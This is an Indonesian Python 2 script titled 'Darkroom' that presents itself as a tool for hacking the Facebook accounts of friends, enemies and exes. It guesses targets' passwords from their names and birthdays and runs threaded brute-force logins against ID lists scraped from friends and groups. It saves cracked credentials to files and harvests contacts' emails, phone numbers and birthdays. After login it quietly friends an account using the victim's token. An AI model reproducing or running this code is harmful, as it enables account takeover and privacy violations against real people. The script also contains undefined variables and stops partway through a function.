#!/usr/bin/python
# -*- coding: utf-8 -*-
# Darkroom
# Mod by Nedi Senja
# Github: github.com/stepbystepexe/Darkroom

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from time import sleep
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser

info = """
Nama        : Darkroom
Versi       : 4.0 (Update: 21 November 2020, 5:00 AM)
Tanggal     : 10 Mei 2019
Mod         : Nedi Senja
Tujuan      : Brefungsi untuk menghek Pesbuk
              teman, musuh dan mantan
Terimakasih : Allah SWT.
              FR13NDS, & seluruh
              manusia seplanet bumi
NB          : Manusia gax ada yang sempurna
              sama kaya yang mod tool ini.
              Silahkan laporkan kritik atau saran
              Ke - Email: d_q16x@outlook.co.id
                 - WhatsApp: +62 8577-5433-901

[ \x1b[4mGunakan tool ini dengan bijak \x1b[0m]\n """

example = """\x1b[0;101;1;77m[     Dark Room Facebook, My Github: @stepbystepexe      ]\x1b[0m"""

logo = """
     \x1b[0;41;31m[ ]\x1b[0m~\x1b[0;42;32m[ ]\x1b[0m~\x1b[0;44;34m[ ]\x1b[0m        \x1b[0;40;37m[-]\x1b[0m
          |              |
\x1b[106;96m[]\x1b[100;90m[]\x1b[0m~\x1b[4m\x1b[0;90;43;1m Dark \x1b[0;97;45;1m Room \033[0;1;77;104m  Facebook   \033[0m~\x1b[103;93m[]\x1b[102;92m[]\x1b[105;95m[]\x1b[107;97m[]\x1b[0m
                 \x1b[1;77m/\x1b[0m
     \x1b[0;90;47;1m * \x1b[0;1;77;44m Mod by \x1b[0;1;77;101m # Nedi Senja \x1b[0m
"""

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/9.4 Chrome/67.0.3396.87 Mobile Safari/537.36')]

back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idfriends = []
idfromfriends = []
idmem = []
id = []
em = []
emfromfriends = []
hp = []
hpfromfriends = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[0mNot Vuln'
vuln = '\x1b[0mVuln'

def restart():
    python = sys.executable
    os.execl(python, python, * sys.argv)
    curdir = os.getcwd()

def exit():
    print
    print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mKeluar dari program!')
    print
    print
    os.sys.exit(1)

def write(o):
    for i in o + '\n':
        sys.stdout.write(i)
        sys.stdout.flush()
        time.sleep(0.01)

def loads():
    x = [
     '.   ', '..  ', '... ']
    for o in x:
        print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mLoading \x1b[0m' + o,
        sys.stdout.flush()
        time.sleep(1)

def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        os.system('reset')
        time.sleep(1)
        print
        print (logo)
        print
        print ('\x1b[0m[\x1b[91;1m/\x1b[0m] \x1b[77;1mMasuk Akun Facebook Anda \x1b[0m[\x1b[91;1m/\x1b[0m]')
        id = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] Email : \x1b[77;1m')
        pwd = getpass.getpass('\x1b[0m[\x1b[93;1m+\x1b[0m] Sandi : \x1b[0m')
        loads()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print ('\n\x1b[0m[\x1b[96;1mx\x1b[0m] \x1b[77;1mTidak ada koneksi')
            exit()
        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = id
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                zedd = open('login.txt', 'w')
                zedd.write(z['access_token'])
                zedd.close()
                print ('\n\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] Berhasil masuk')
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                os.system('xdg-open https://github.com/stepbystepexe')
                time.sleep(1)
                menu()
            except requests.exceptions.ConnectionError:
                print ('\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTidak ada koneksi')
                exit()
        if 'checkpoint' in url:
            print ('\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAkun di baned, cekpoint')
            os.system('rm -rf login.txt')
            time.sleep(1)
            exit()
        else:
            print ('\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTidak dapat masuk')
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()

def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        os.system('reset')
        print
        print (logo)
        print
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            nama = a['name']
            id = a['id']
            ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
            b = json.loads(ots.text)
            sub = str(b['summary']['total_count'])
        except KeyError:
            os.system('clear')
            os.system('reset')
            print
            print (logo)
            print
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAkun di baned, cekpoint')
            os.system('rm -rf login.txt')
            time.sleep(1)
            login()
        except requests.exceptions.ConnectionError:
            print
            print (logo)
            print
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTidak ada koneksi')
            exit()
    os.system('clear')
    os.system('reset')
    print
    print
    print (logo)
    print
    print '\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mNama     : \x1b[0m' + nama + (39 - len(nama)) * '\x1b[0m '+''
    print '\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[77;1mID       : \x1b[0m' + id + (39 - len(id)) *     '\x1b[0m '+''
    print '\x1b[0m[\x1b[93;1m+\x1b[0m] \x1b[77;1mPengikut : \x1b[0m' + sub + (39 - len(sub)) *   '\x1b[0m '+''
    print
    print ('\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mInformasi Pengguna')
    print ('\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mRetas Akun Facebook')
    print ('\x1b[0m[\x1b[96;1m3\x1b[0m] \x1b[77;1mTanggapi Postingan')
    print ('\x1b[0m[\x1b[96;1m4\x1b[0m] \x1b[77;1mHal Menarik Lainnya')
    print ('\x1b[0m[\x1b[96;1m5\x1b[0m] \x1b[77;1mKeluar dari Facebook')
    print
    print ("\x1b[0m[\x1b[93;1m&\x1b[0m] LISENSI")
    print ("\x1b[0m[\x1b[94;1m#\x1b[0m] Informasi")
    print ("\x1b[0m[\x1b[92;1m*\x1b[0m] Perbarui")
    print ("\x1b[0m[\x1b[91;1m-\x1b[0m] Keluar")
    menu_select()

def menu_select():
    menu = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mMasukan Opsi: ')
    if abc == '':
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mPilihan tidak ada')
        menu_select()
    else:
        if menu == '01' or menu == '1':
            information()
        else:
            if menu == '02' or menu == '2':
                menu_hack()
            else:
                if menu == '03' or menu == '3':
                    menu_bot()
                else:
                    if menu == '04' or menu == '4':
                        other()
                    else:
                        if menu == '05' or menu == '5':
                            os.system('rm -rf login.txt')
                            os.system('xdg-open https://m.facebook.com/akun.fake.016')
                            exit()
                        else:
                            if menu.strip() in '& 6 lisensi'.split():
                                print
                                os.system('nano LICENSE')
                                print
                                restart()
                            else:
                                if menu.strip() in '# 7 info'.split():
                                    os.system('clear')
                                    print(example)
                                    os.system('toilet -f smslant DarkRoom')
                                    print(info)
                                    time.sleep(1)
                                    print
                                    raw_input('[ Tekan Enter ]')
                                    restart()
                                else:
                                    if menu.strip() in '* 8 perbarui'.split():
                                        print
                                        os.system('git pull origin master')
                                        print
                                        raw_input('\n\x1b[0m[ \x1b[32mTekan Enter \x1b[0m]')
                                        menu()
                                    else:
                                        if menu.strip() in '- 0 keluar'.split():
                                            exit()
                                        else:
                                            print '\x1b[0m[\x1b[94;1m\xe2\x9c\x96\x1b[0m] \x1b[0m' + menu + ' \x1b[77;1mTidak ditemukan'
                                            menu_select()

def information():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    os.system('reset')
    print
    print (logo)
    print
    id = raw_input('\x1b[0m[\x1b[92;1m?\x1b[0m] \x1b[77;1mMasukan ID ( Nama ): \x1b[0m')
    write ('\x1b[0m[\x1b[95;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
    r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
    cok = json.loads(r.text)
    for p in cok['data']:
        if id in p['name'] or id in p['id']:
            r = requests.get('https://graph.facebook.com/' + p['id'] + '?access_token=' + toket)
            z = json.loads(r.text)
            try:
                print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mNama\x1b[77;1m          : ' + z['name']
            except KeyError:
                print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[0mNama\x1b[77;1m          : \x1b[77;1mTidak ada'
            else:
                try:
                    print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mID\x1b[77;1m            : ' + z['id']
                except KeyError:
                    print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[0mID\x1b[77;1m            : \x1b[77;1mTidak ada'
                else:
                    try:
                        print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mEmail\x1b[77;1m         : ' + z['email']
                    except KeyError:
                        print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[0mEmail\x1b[77;1m         : \x1b[77;1mTidak ada'
                    else:
                        try:
                            print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mNomor Telpon\x1b[77;1m  : ' + z['mobile_phone']
                        except KeyError:
                            print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[0mNomor Telepon\x1b[77;1m  : \x1b[77;1mTidak ada'
                        try:
                            print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mAlamat\x1b[77;1m      : ' + z['location']['name']
                        except KeyError:
                            print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[0mAlamat\x1b[77;1m      : \x1b[77;1mTidak ada'
                    try:
                        print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mTanggal Lahir\x1b[77;1m      : ' + z['birthday']
                    except KeyError:
                        print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[0mTanggal lahir\x1b[77;1m      : \x1b[77;1mTidak ada'
                try:
                    print '\x1b[0m[\x1b[96;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mSekolah\x1b[77;1m        : '
                    for q in z['education']:
                        try:
                            print '\x1b[0m                   ~ \x1b[77;1m' + q['school']['name']
                        except KeyError:
                            print '\x1b[0m                   ~ \x1b[77;1mTidak ada'
                except KeyError:
                    pass
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            menu()
    else:
        print ('\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mPengguna tidak ditemukan')
        raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
        menu()

def menu_hack():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    os.system('reset')
    print
    print (logo)
    print
    print ('\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mMini Hack Facebook (\x1b[0mTarget\x1b[0m)')
    print ('\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mMulti Bruteforce Facebook')
    print ('\x1b[0m[\x1b[96;1m3\x1b[0m] \x1b[77;1mSuper Multi Bruteforce Facebook')
    print ('\x1b[0m[\x1b[96;1m4\x1b[0m] \x1b[77;1mBruteforce (\x1b[0mTarget\x1b[0m)')
    print ('\x1b[0m[\x1b[96;1m5\x1b[0m] \x1b[77;1mYahoo Checker')
    print ('\x1b[0m[\x1b[96;1m6\x1b[0m] \x1b[77;1mAmbil ID/Email/HP')
    print ('\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mKembali')
    print
    hack_select()

def hack_select():
    hack = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1maMasukan Opsi: ')
    if hack == '':
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mPilihan tidak ada')
        hack_select()
    else:
        if hack == '01' or hack == '1':
            mini()
        else:
            if hack == '02' or hack == '2':
                crack()
                score()
            else:
                if hack == '03' or hack == '3':
                    super()
                else:
                    if hack == '04' or hack == '4':
                        brute()
                    else:
                        if hack == '05' or hack == '5':
                            menu_yahoo()
                        else:
                            if hack == '06' or hack == '6':
                                grab()
                            else:
                                if hack == '00' or hack == '0':
                                    menu()
                                else:
                                    print '\x1b[0m[\x1b[94;1m\xe2\x9c\x96\x1b[0] ' + hack + ' \x1b[77;1mTidak ditemukan'
                                    hack_select()

def mini():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print
        print (logo)
        print
        print ('\x1b[0m[ \x1b[94;1mINFO \x1b[0m] \x1b[77;1mTarget harus teman anda')
        print
        try:
            id = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mMasukan ID Target :\x1b[77;1m ')
            write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
            r = requests.get('https://graph.facebook.com/' + id + '?access_token=' + toket)
            a = json.loads(r.text)
            print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mNama\x1b[77;1m : ' + a['name']
            write ('\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[77;1mMengecek \x1b[77;1m...')
            time.sleep(2)
            write ('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mMembuka keamanana \x1b[77;1m...')
            time.sleep(2)
            write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMemproses \x1b[77;1m...')
            print
            pz1 = a['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            y = json.load(data)
            if 'access_token' in y:
                print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mMendapatkan.'
                print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mNama\x1b[77;1m     : ' + a['name']
                print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPengguna\x1b[77;1m : ' + id
                print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mSandi\x1b[77;1m    : ' + pz1
                raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
                menu_hack()
            else:
                if 'www.facebook.com' in y['error_msg']:
                    print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mMendapatkan.'
                    print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAkun kena cekpoint'
                    print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mNama\x1b[77;1m     : ' + a['name']
                    print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPengguna\x1b[77;1m : ' + id
                    print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mSandi\x1b[77;1m    : ' + pz1
                    raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
                    menu_hack()
                else:
                    pz2 = a['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    y = json.load(data)
                    if 'access_token' in y:
                        print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mMendapatkan.'
                        print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mNama\x1b[77;1m     : ' + a['name']
                        print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPengguna\x1b[77;1m : ' + id
                        print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mSandi\x1b[77;1m    : ' + pz2
                        raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
                        menu_hack()
                    else:
                        if 'www.facebook.com' in y['error_msg']:
                            print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mMendapatkan.'
                            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAkun kena cekpoint'
                            print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mNama\x1b[77;1m     : ' + a['name']
                            print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPengguna\x1b[77;1m : ' + id
                            print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mSandi\x1b[77;1m    : ' + pz2
                            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
                            menu_hack()
                        else:
                            pz3 = a['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            y = json.load(data)
                            if 'access_token' in y:
                                print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mMendapatkan.'
                                print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mNama\x1b[77;1m     : ' + a['name']
                                print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPengguna\x1b[77;1m : ' + id
                                print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mSandi\x1b[77;1m    : ' + pz3
                                raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
                                menu_hack()
                            else:
                                if 'www.facebook.com' in y['error_msg']:
                                    print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mMendapatkan.'
                                    print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAkun kena cekpoint'
                                    print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mNama\x1b[77;1m     : ' + a['name']
                                    print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPengguna\x1b[77;1m : ' + id
                                    print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mSandi\x1b[77;1m    : ' + pz3
                                    raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
                                    menu_hack()
                                else:
                                    lahir = a['birthday']
                                    pz4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pz4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    y = json.load(data)
                                    if 'access_token' in y:
                                        print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mMendapatkan.'
                                        print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mNama\x1b[77;1m     : ' + a['name']
                                        print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPengguna\x1b[77;1m : ' + id
                                        print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mSandi\x1b[77;1m    : ' + pz4
                                        raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
                                        menu_hack()
                                    else:
                                        if 'www.facebook.com' in y['error_msg']:
                                            print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mMendapatkan.'
                                            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mAkun kena cekpoint'
                                            print '\x1b[0m[\x1b[92;1m\xe2\x9c\x93\x1b[0m] \x1b[0mNama\x1b[77;1m     : ' + a['name']
                                            print '\x1b[0m[\x1b[92;1m\xe2\x9e\xb9\x1b[0m] \x1b[0mPengguna\x1b[77;1m : ' + id
                                            print '\x1b[0m[\x1b[94;1m\xe2\x9e\xb9\x1b[m0] \x1b[0mSandi\x1b[77;1m    : ' + pz4
                                            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
                                            menu_hack()
                                        else:
                                            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mMaaf, untuk membuka sandi target gagal :('
                                            print '\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mGunakan yang lainnya.'
                                            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
                                            menu_hack()
        except KeyError:
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mTerget tidak ditemukan')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            menu_hack()

def crack():
    global file
    global idlist
    global passw
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        os.system('clear')
        os.system('reset')
        print
        print (logo)
        print
        idlist = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mMasukan Berkas ID : \x1b[0m')
        passw = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSandi : \x1b[0m')
        try:
            file = open(idlist, 'r')
            write ('\x1b[0m[\x1b[93;1m\xe2\x9c\xba\x1b[0m] \x1b[77;1mMengecek \x1b[77;1m...')
            for x in range(40):
                zedd = threading.Thread(target=scrak, args=())
                zedd.start()
                threads.append(zedd)

            for zedd in threads:
                zedd.join()
        except IOError:
            print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mBerkas tidak ditemukan')
            raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
            menu_hack()

def scrak():
    global back
    global success
    global cekpoint
    global gagal
    global up
    try:
        buka = open(idlist, 'r')
        up = buka.read().split()
        while file:
            username = file.readline().strip()
            url = 'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + username + '&locale=en_US&password=' + passw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6'
            data = urllib.urlopen(url)
            mpsh = json.load(data)
            if back == len(up):
                break
            if 'access_token' in mpsh:
                bisa = open('Success.txt', 'w')
                bisa.write(username + ' | ' + passw + '\n')
                bisa.close()
                success.append('\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] ' + username + ' | ' + passw)
                back += 1
            else:
                if 'www.facebook.com' in mpsh['error_msg']:
                    cek = open('Cekpoint.txt', 'w')
                    cek.write(username + ' | ' + passw + '\n')
                    cek.close()
                    cekpoint.append('\x1b[0m[\x1b[91;1m\xe2\x9c\x9a\x1b[0m] ' + username + ' | ' + passw)
                    back += 1
                else:
                    gagal.append(username)
                    back += 1
            sys.stdout.write('\r\x1b[0m[\x1b[95;1m\xe2\x9c\xb8\x1b[0m] \x1b[77;1mMengcrack    \x1b[77;1m:\x1b[77;1m ' + str(back) + ' \x1b[0m>\x1b[77;1m ' + str(len(up)) + ' =>\x1b[0mSekarang\x1b[77;1m:\x1b[77;1m' + str(len(success)) + ' \x1b[0m=>\x1b[0mMengecek\x1b[77;1m:\x1b[77;1m' + str(len(cekpoint)))
            sys.stdout.flush()

    except IOError:
        print ('\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mKoneksi terganggu')
        time.sleep(1)
    except requests.exceptions.ConnectionError:
        print ('\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[77;1mTidak ada koneksi')

def score():
    print
    for b in success:
        print b

    for c in cekpoint:
        print c

    print
    print '\x1b[0m[\x1b[91;1mx\x1b[0m] \x1b[77;1mGagal \x1b[0m--> ' + str(len(gagal))
    exit()

def super():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mToken tidak ditemukan')
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    os.system('clear')
    os.system('reset')
    print
    print (logo)
    print
    print ('\x1b[0m[\x1b[96;1m1\x1b[0m] \x1b[77;1mCrack dari Teman')
    print ('\x1b[0m[\x1b[96;1m2\x1b[0m] \x1b[77;1mCrack dari Grup')
    print ('\x1b[0m[\x1b[96;1m3\x1b[0m] \x1b[77;1mCrack dari Berkas')
    print ('\x1b[0m[\x1b[96;1m0\x1b[0m] \x1b[77;1mKembali')
    print
    super_select()

def super_select():
    supers = raw_input('\x1b[0m[\x1b[95;1m~\x1b[0m] \x1b[77;1mMasukan Opsi: ')
    if supers == '':
        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mPilihan tidak ada')
        super_select()
    else:
        if supers == '01' or supers == '1':
            os.system('clear')
            os.system('reset')
            print
            print (logo)
            print
            write ('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mMemuat ID dari teman \x1b[77;1m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id.append(s['id'])
        else:
            if supers == '02' or supers == '2':
                os.system('clear')
                os.system('reset')
                print
                print (logo)
                print
                idg = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mMasukan ID Grup :\x1b[77;1m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '\x1b[0m[\x1b[96;1m\xe2\x9c\x93\x1b[0m] \x1b[0mNama Grup :\x1b[77;1m ' + asw['name']
                except KeyError:
                    print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mGrup tidak ditemukan')
                    raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
                    super()
                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id.append(i['id'])
            else:
                if supers == '03' or supers == '3':
                    os.system('clear')
                    os.system('reset')
                    print
                    print (logo)
                    print
                    try:
                        idlist = raw_input('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[0mMasukan Berkas ID : \x1b[77;1m')
                        for line in open(idlist,'r').readlines():
                                id.append(line.strip())
                    except IOError:
                        print ('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mBerkas tidak ditemukan')
                        raw_input('\n\x1b[0m[ \x1b[93;1mKembali \x1b[0m]')
                        super()
                else:
                    if supers == '00' or supers == '0':
                        menu_hack()
                    else:
                        print '\x1b[0m[\x1b[91;1m\xe2\x9c\x96\x1b[0m] \x1b[0m' + otf + ' \x1b[77;1mTidak ditemukan'
                        super_select()
    print '\x1b[0m[\x1b[95;1m+\x1b[0m] \x1b[0mJumlah ID : \x1b[77;1m' + str(len(id))
